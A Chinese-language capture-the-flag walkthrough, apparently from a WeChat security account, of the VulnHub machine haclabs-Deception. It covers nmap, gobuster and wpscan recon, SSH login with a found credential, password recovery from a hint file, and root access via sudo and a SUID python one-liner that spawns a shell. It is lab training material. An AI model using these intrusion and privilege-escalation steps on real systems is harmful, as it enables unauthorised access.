> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WWTGcnRP1IKF7gNPJ6R18w)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6nNyjd9QeAUdlJnqcbr4Ys8FkITF5IX4d9ER5WHB4uz0CSWlE3X4LMvu9yaZhib7zPDu1QEJQEveg/640?wx_fmt=gif)

点击上方蓝字  关注我们

  

靶机系列测试 haclabs-Deception

  

1

介绍

最近暗月在每个星期六都有一个网络公开课，主要是技术分享，有需要的朋友关注公众号，今天这篇文章是昨晚做公开课的技术文档，会把一些技术细节分享在这里，这可能与直播有点出入，因为直播问题比较多，因此会更加详细。

2

靶机介绍

  

<table cellspacing="0" data-width="100%"><tbody><tr><th data-brushtype="text" width="181">描述</th><th data-brushtype="text" width="518">详细</th></tr><tr><td>Difficulty</td><td width="193">Easy to Intermediate</td></tr><tr><td>Description</td><td width="193">This a beginner level machine , getting a shell is a little bit harder, just think out of the box to get the shell.privilege escalation is easy once you get the shell.This machine has 3 flags. Each flag is present in the Home directory of particular user. Be ready to test your Linux skills.</td></tr><tr><td>Flag</td><td width="193">3</td></tr></tbody></table>

下载地址：

https://www.vulnhub.com/entry/haclabs-deception,427/

3

靶机测试过程

3.1  信息收集

3.1.1 nmap 扫描

nmap -sC -sV 192.168.0.191 -oA deception-port -Pn

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LNVeDOv9XC9zcQ1yLUFfJmap71NGjicZgVnUSrHH1kCeicrpFW3ok1klQ/640?wx_fmt=png)

2.1  访问主页

访问 ip 是一个 Ubuntu apache 的默认主页 根据扫描软件 发现主页的存在 wordpress 再用扫描工具探测软件下是否存在其他敏感文件。

http://192.168.0.191/

http://192.168.0.191/wordpress

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LicMEibrPxvjCAqH4HPibQWa90JP7wia5XLDOFnJvibt3BVg2KiaOsQTtuIZg/640?wx_fmt=png)

3.3  目录扫描

gobuster dir -u http://192.168.0.191/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "php,html" -t 100

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LQcWZjlVW2obdUa2ib5On0JTnia7JchK316dCsRCxCabN0cOT4J7FmxNQ/640?wx_fmt=png)

/index.php (Status: 301)

/wp-content (Status: 301)

/wp-login.php (Status: 200)

/wp-includes (Status: 301)

/readme.html (Status: 200)

/robots.html (Status: 200)

/wp-trackback.php (Status: 200)

/wp-admin (Status: 301)

/wp-signup.php (Status: 302)

/hint.html (Status: 200)

http://192.168.0.191/wordpress//robots.html

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LtZEt8TWdQ7zEAewfwXeyAdNd6pvfzSwylXWudPqXb2sDh4KcBlulBQ/640?wx_fmt=png)

http://192.168.0.191/wordpress//hint.html

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Ljic9vCsDtvp2s5wMSB2WtZGD2CpydmsAvXc6iaMGRcZkeAOIUTtmEgtQ/640?wx_fmt=png)

Please collect all the API tokens availabe on the home page

请收集主页上所有可用的 API 令牌

3.4  收集 api 令牌

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LdmQO0JAGDKx2uNEFNcNbR4GLWwicCb6AZkLYSp8jXfKLVyCicLjDBddw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LulxK2R6zGOJYOLibBqVfmzIMuic2As14O8OGV1F9esOTnfzrdmtibEgZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LkVcMzHY8ajicMPCTuq5cdgqvEG6VbQn85MAmff9CicaPsaQ7ic60zMcMQ/640?wx_fmt=png)

token api

5F4DCC3B5AA765D61D8327DEB882CF99

这个解密就是 password 可能这个就是密码。

3.5 收集 wordpress 账号

wpscan --url http://192.168.0.191/wordpress -e u

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LfgyPLED27EtSMcC61o3HEaI74JRicqeMsicvHDGX7bvwKhCqUwJzH1Kw/640?wx_fmt=png)

3.6 ssh 登录

密码 5F4DCC3B5AA765D61D8327DEB882CF99

ssh yash@192.168.0.191

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Lw8H79CYwldYdZTSwZGy384TjrKDKDpXuO5CWhCs3SUwMcxHOYP5TXg/640?wx_fmt=png)

3.7 获取第一个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Lcp3yNicG6n92h9siaiaicqsFEKibZNoMLbR7URNibw0PL7qmaoWwHBsq2KqA/640?wx_fmt=png)

3.8 获取 haclabs 密码

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LHKIdNn1qlLUOF9S8Zcicial8RTRO8ObG90hWfepv3ygqP4aQU5XcL30g/640?wx_fmt=png)

cat .systemlogs

ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd"haclabs"jsdskdjskdjsldsklfjlkfdgl/dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue"A=123456789"fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld"+A[::-1]"fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10L5DT2PpC0kgSwDef7AibfOvIFMZoohdnIvXd5RsfXcG1RncUKEVbfLeg/640?wx_fmt=png)

haclabs A=123456789 +A[::-1]

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LJnbTHMSjmVgKicEU3Q0vrYwgR01QP9fDeBUDJQ2dbHKb9lOPP1ibYHqw/640?wx_fmt=png)

密码可能是 haclabs 987654321 haclabs987654321

密码 haclabs987654321

su haclabs

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LPSIQbVSic4jU3hNhpAEVclO5JYMyDXL7DkI7yx6zKLVYsBTc1kXKKvw/640?wx_fmt=png)

3.9 获取第二个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LsPNEsHXuHHZNcLthehiciaUHKWh6ictu35EGORPfQ3EQJaPYP1LAgzaeg/640?wx_fmt=png)。![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Lr0icMicKc8dRjqVZ5ajyxc1VPu6RUBf5micPsKuib3rrNicNLUUFszozCqQ/640?wx_fmt=png)

3.10 特权提升

3.1.1  sudo 提权

sudo -l

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LLHlfiaEAewjqu4ibNiaDvEPibTbJcL1VpIDxVeJccZqcA7uyNib96VRHKicw/640?wx_fmt=png)

看到输入密码就可以执行任何命令

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LAL7KoT426jP3U6sTlfAmL6c7t0xGnyFMqMsJ5trTFxcT5icGxQDwa9g/640?wx_fmt=png)

3.10.2 suid 提权

find / -type f -perm -u=s 2>/dev/null

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Lwqib14H4LV9u2BJ9N5LNzTChNAQPEnEgLOJvMX6m0DYPesYSCbH3H4Q/640?wx_fmt=png)

/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10Lc7qAr7f19jkLd9yv11WbCJkx2JxNOq2harEzJHicsdkReAhsY7d4ickQ/640?wx_fmt=png)

3.11，获取第三个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LBECSibROV7Rict6Bv3SZ9icPnUMvHZsf4PUuC2Q7DlbwDNGluaSvhiaryQ/640?wx_fmt=png)

4

关注公众号

如果本人你对有用，请点击收藏和分享。你的支持是我们的动力。

关注本公众号 不定期更新干货。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACQPRujtygx9a6DO0LZE10LzlDZwgPbIav3ic5N76uwWe569FFjYIm6a8EBhLBd7qzNsy7MDLfiadicQ/640?wx_fmt=jpeg)